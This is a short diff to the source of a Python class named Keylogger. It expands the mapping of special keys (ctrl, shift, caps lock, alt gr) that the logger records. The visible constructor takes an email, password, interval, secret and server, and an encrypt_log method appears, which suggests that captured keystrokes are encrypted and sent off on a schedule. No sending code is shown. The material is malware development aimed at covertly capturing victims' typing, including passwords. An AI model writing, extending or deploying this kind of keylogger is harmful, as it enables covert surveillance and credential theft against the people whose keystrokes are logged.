@@ -18,7 +18,13 @@ class Keylogger:
         Key.enter: "[ENTER]\n",
         Key.esc: "[ESC]",
         Key.tab: "[TAB]",
-        Key.backspace: "[BACKSPACE]"}
+        Key.backspace: "[BACKSPACE]",
+        Key.ctrl: "[CTRL]",
+        Key.shift: "[LEFT SHIFT]",
+        Key.shift_r: "[RIGHT SHIFT]",
+        Key.caps_lock: "[CAPS LOCK]",
+        Key.alt_gr: "[ALT GR]"
+    }
 
     def __init__(self, email, password, time_interval, secret, server):
         self.interval = time_interval
@@ -36,6 +42,7 @@ class Keylogger:
             name = key.char
         except AttributeError:
             name = Keylogger.ks.get(key, str(key))
+
         self.update_log(name.replace("'", ""))
 
     def encrypt_log(self):
